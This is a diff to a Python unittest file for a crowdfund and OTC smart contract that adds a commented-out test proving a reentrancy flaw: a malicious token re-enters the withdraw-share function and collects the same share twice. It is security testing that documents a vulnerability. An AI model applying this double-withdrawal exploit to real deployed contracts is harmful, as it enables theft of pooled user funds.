@@ -572,6 +572,113 @@ class TestCrowdfundContractMoreCases(unittest.TestCase):
         
     #     print(f"Test confirmed: {expected_trapped_tokens} pool_tokens are trapped in the crowdfund contract for pool_id {pool_id}.")
 
+     # --- This test case was used to demonstrate that there was the vulnerability of reentrancy ---
+    # def test_reentrancy_withdraw_share_double_payment(self):
+    #     print("\n--- Test: Re-entrancy in Withdraw Share (Double Payment) ---")
+        
+    #     malicious_token_contract_name = self.malicious_token_name 
+    #     mt_address = malicious_token_contract_name 
+        
+    #     attacker_owner = self.operator 
+
+    #     con_mt = self.client.get_contract(malicious_token_contract_name)
+
+    #     pool_creation_time = self._get_future_time(self.base_time, hours=1)
+    #     pool_id = self.con_crowdfund_otc.create_pool(
+    #         description="Re-entrancy Withdraw Share Pool",
+    #         pool_token=self.pool_token_name, 
+    #         hard_cap=decimal('1000'),
+    #         soft_cap=decimal('100'), 
+    #         signer=self.alice, 
+    #         environment={"now": pool_creation_time} # This sets 'now' for create_pool
+    #     )
+
+    #     contribution_amount_mt = decimal('100') 
+
+    #     self.con_pool_token.transfer(amount=contribution_amount_mt, to=mt_address, signer=self.operator)
+    #     self.assertEqual(self.con_pool_token.balance_of(address=mt_address), contribution_amount_mt)
+        
+    #     con_mt.execute_token_approve(
+    #         token_contract_name=self.pool_token_name,
+    #         spender=self.crowdfund_contract_name,
+    #         amount=contribution_amount_mt,
+    #         signer=attacker_owner 
+    #     )
+        
+    #     # Define the time for the contribution
+    #     contrib_time = self._get_future_time(pool_creation_time, minutes=10) # Well within 5 days
+
+    #     # MODIFICATION: Pass the environment to the execute_contribute call
+    #     con_mt.execute_contribute(
+    #         crowdfund_contract_name=self.crowdfund_contract_name,
+    #         pool_id=pool_id,
+    #         amount=contribution_amount_mt,
+    #         signer=attacker_owner,
+    #         environment={"now": contrib_time} # Set 'now' for this transaction
+    #     )
+    #     self.assertEqual(self.con_crowdfund_otc.contributor[mt_address, pool_id]['amount_contributed'], contribution_amount_mt)
+    #     self.assertEqual(self.con_crowdfund_otc.pool_fund[pool_id]['amount_received'], contribution_amount_mt)
+
+    #     charlie_mt_balance = decimal('1000')
+    #     con_mt.mint(amount=charlie_mt_balance, to=self.charlie, signer=attacker_owner)
+    #     con_mt.approve(amount=charlie_mt_balance, to=self.otc_contract_name, signer=self.charlie)
+
+    #     otc_total_take_amount_mt = decimal('200') 
+        
+    #     time_for_listing = self._get_future_time(contrib_time, days=6) # contrib_time + 6 days
+    #                                                                    # = pool_creation_time + 10 mins + 6 days
+    #                                                                    # This is > pool_creation_time + 5 days (contrib deadline)
+    #                                                                    # which is correct for listing.
+
+    #     self.con_crowdfund_otc.list_pooled_funds_on_otc(
+    #         pool_id=pool_id,
+    #         otc_take_token=malicious_token_contract_name, 
+    #         otc_total_take_amount=otc_total_take_amount_mt,
+    #         signer=self.alice, 
+    #         environment={"now": time_for_listing} # Set 'now' for listing
+    #     )
+        
+    #     otc_listing_id = self.con_crowdfund_otc.pool_fund[pool_id]['otc_listing_id']
+    #     time_for_taking_offer = self._get_future_time(time_for_listing, minutes=30)
+        
+    #     self.con_otc.take_offer(
+    #         listing_id=otc_listing_id,
+    #         signer=self.charlie,
+    #         environment={"now": time_for_taking_offer} # Set 'now' for taking offer
+    #     )
+        
+    #     self.assertEqual(con_mt.balance_of(address=self.crowdfund_contract_name), otc_total_take_amount_mt)
+        
+    #     con_mt.configure_re_entrancy_for_withdraw(
+    #         crowdfund_name=self.crowdfund_contract_name,
+    #         pool_id=pool_id,
+    #         signer=attacker_owner
+    #     )
+        
+    #     con_mt.mint(amount=decimal('500'), to=self.crowdfund_contract_name, signer=attacker_owner)
+        
+    #     mt_balance_before_exploit_adjusted = con_mt.balance_of(address=mt_address)
+
+    #     time_for_withdraw = self._get_future_time(time_for_taking_offer, minutes=5)
+    #     con_mt.execute_withdraw_share(
+    #         crowdfund_contract_name=self.crowdfund_contract_name,
+    #         pool_id=pool_id,
+    #         signer=attacker_owner,
+    #         environment={"now": time_for_withdraw} # Set 'now' for withdraw
+    #     )
+    #     mt_balance_after_exploit_adjusted = con_mt.balance_of(address=mt_address)
+
+    #     expected_single_share = otc_total_take_amount_mt 
+        
+    #     self.assertEqual(
+    #         mt_balance_after_exploit_adjusted,
+    #         mt_balance_before_exploit_adjusted + (expected_single_share * 2),
+    #         "MT contract should have received its share twice."
+    #     )
+
+    #     self.assertEqual(con_mt.balance_of(address=self.crowdfund_contract_name), decimal('300'))
+        
+    #     self.assertTrue(self.con_crowdfund_otc.contributor[mt_address, pool_id]['share_withdrawn'])
 
 if __name__ == '__main__':
     # This allows running the tests from the command line
